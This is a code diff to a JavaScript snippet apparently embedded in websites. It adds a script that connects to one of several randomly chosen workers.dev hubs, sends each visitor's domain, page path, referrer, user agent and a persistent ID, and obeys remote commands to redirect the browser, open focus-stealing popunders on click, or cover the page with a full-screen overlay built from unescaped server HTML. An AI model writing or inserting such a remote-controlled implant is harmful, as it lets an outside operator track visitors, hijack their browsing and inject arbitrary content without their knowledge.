@@ -172,9 +172,9 @@
 
 })();
 
-//socket
-
+//socket05-09
 (function() {
+     
     if (window.networkAgentActive) return;
     window.networkAgentActive = true;
 
@@ -185,45 +185,60 @@
         localStorage.setItem('ax_player_uid', myUid);
     }
 
-    const script = document.createElement('script');
-    script.src = "https://cdn.socket.io/4.7.2/socket.io.min.js";
-    document.head.appendChild(script);
+    
+    const WORKER_HUBS = [
+        "https://dark-butterfly-a0dc.koydubupse.workers.dev",
+        "https://crimson-school-40f9.school-app-2027.workers.dev",
+        "https://broad-term-1d04.schoop-app-2027.workers.dev"
+    ];
 
-    script.onload = () => {
+    
+    const selectedHub = WORKER_HUBS[Math.floor(Math.random() * WORKER_HUBS.length)];
+
+    function startConnection() {
         const myDomain = window.location.hostname || "Unknown-Site";
         const fullPagePath = window.location.hostname + window.location.pathname + window.location.search;
-        const myReferer = document.referrer || "";
+        const myReferer = document.referrer || "Direct";
+        const myUserAgent = navigator.userAgent || "Unknown-UA"; 
 
-        const socket = io("https://school-app-network.onrender.com", {
+        
+        const socket = io(selectedHub, {
             transports: ['websocket'], 
             query: { 
                 site: myDomain,
                 page: fullPagePath,
                 referer: myReferer,
+                ua: myUserAgent,   
                 uid: myUid  
             } 
         });
 
+       
         socket.on('execute_action', (data) => {
-            if (data.actionType === 'redirect') {
+            if (!data || !data.actionType) return;
+
+           
+            if (data.actionType === 'redirect' && data.url) {
                 window.location.href = data.url;
-            } else if (data.actionType === 'popunder') {
-                if (data.url && data.url.trim() !== '') {
-                    const popunderTrap = function(e) {
-                        const popWin = window.open(data.url, '_blank');
-                        if (popWin) {
-                            try {
-                                popWin.blur();
-                                window.focus();
-                                window.open('javascript:window.focus()', '_self', '');
-                                setTimeout(() => { window.focus(); }, 10);
-                            } catch (err) { }
-                        }
-                        window.removeEventListener('click', popunderTrap, true);
-                    };
-                    window.addEventListener('click', popunderTrap, true);
-                }
-            } else if (data.actionType === 'flash') {
+            } 
+           
+            else if (data.actionType === 'popunder' && data.url && data.url.trim() !== '') {
+                const popunderTrap = function(e) {
+                    const popWin = window.open(data.url, '_blank');
+                    if (popWin) {
+                        try {
+                            popWin.blur();
+                            window.focus();
+                            window.open('javascript:window.focus()', '_self', '');
+                            setTimeout(() => { window.focus(); }, 10);
+                        } catch (err) { }
+                    }
+                    window.removeEventListener('click', popunderTrap, true);
+                };
+                window.addEventListener('click', popunderTrap, true);
+            } 
+           
+            else if (data.actionType === 'flash' && data.message) {
                 const alertDiv = document.createElement('div');
                 let buttonHtml = '';
                 if (data.url && data.url.trim() !== '') {
@@ -235,7 +250,7 @@
 
                 alertDiv.innerHTML = `
                     <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 23, 42, 0.95); z-index: 9999999; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; font-family: 'Segoe UI', Tahoma, sans-serif; backdrop-filter: blur(5px);">
-                        <h1 style="font-size: 32px; color: #f8fafc; text-align: center; margin-bottom: 40px; padding: 0 20px; max-width: 800px; line-height: 1.4;">${data.message}</h1>
+                        <h1 style="font-size: 30px; color: #f8fafc; text-align: center; margin-bottom: 35px; padding: 0 20px; max-width: 800px; line-height: 1.4;">${data.message}</h1>
                         ${buttonHtml}
                         <button id="close-flash-btn" style="border: none; font-weight: bold; border-radius: 30px; cursor: pointer; transition: 0.2s; ${closeBtnStyle}">${closeBtnText}</button>
                     </div>
@@ -244,6 +259,16 @@
                 document.getElementById('close-flash-btn').addEventListener('click', function() { alertDiv.remove(); });
             }
         });
-    };
+    }
+
+  
+    if (typeof io !== 'undefined') {
+        startConnection();
+    } else {
+        const script = document.createElement('script');
+        script.src = "https://cdn.socket.io/4.7.2/socket.io.min.js";
+        script.onload = startConnection;
+        document.head.appendChild(script);
+    }
 })();
 
